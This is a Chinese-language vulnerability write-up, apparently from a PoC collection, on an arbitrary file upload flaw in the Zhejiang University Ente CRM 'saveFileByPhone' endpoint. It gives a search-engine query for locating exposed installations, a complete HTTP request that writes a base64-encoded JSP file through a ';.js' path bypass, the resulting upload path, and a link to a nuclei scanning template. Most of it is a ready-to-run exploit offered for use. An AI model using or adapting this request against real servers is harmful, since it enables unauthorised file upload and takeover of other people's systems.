# 浙大恩特CRM saveFileByPhone任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM saveFileByPhone存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/m5SQOJdEFI4o4V07/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-943390.png)

# 四、漏洞复现
```java
POST /entsoft/ProductAction.entphone;.js?method=saveFileByPhone&goonum=954572337&filename=usnw9.jsp&imageData=Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI= HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Length: 4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

test
```

![1703401674950-b3f8a679-e77e-4c9e-bf22-6a23f8f5fdd5.png](./img/m5SQOJdEFI4o4V07/1703401674950-b3f8a679-e77e-4c9e-bf22-6a23f8f5fdd5-885837.png)

```java
Ijwlb3V0LnByaW50KDEyNTQxMjU2Mik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPiI=
```

![1703401771766-b3589322-1fb9-4c79-86d3-a6d5e357d028.png](./img/m5SQOJdEFI4o4V07/1703401771766-b3589322-1fb9-4c79-86d3-a6d5e357d028-381143.png)

上传文件位置

```java
/entsoft/image/goocodimg/goodoc/954572337/usnw9.jsp;.js
```

![1703401707921-384444ad-1b9e-4257-974f-61b976f5bb4d.png](./img/m5SQOJdEFI4o4V07/1703401707921-384444ad-1b9e-4257-974f-61b976f5bb4d-650115.png)

nuclei脚本

[浙大恩特客户资源管理系统-productaction-entphone--任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145337-f07f5255-5e64-4561-a65f-567e7b6375d4.yaml)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ffdm30fuhx2pn2ih>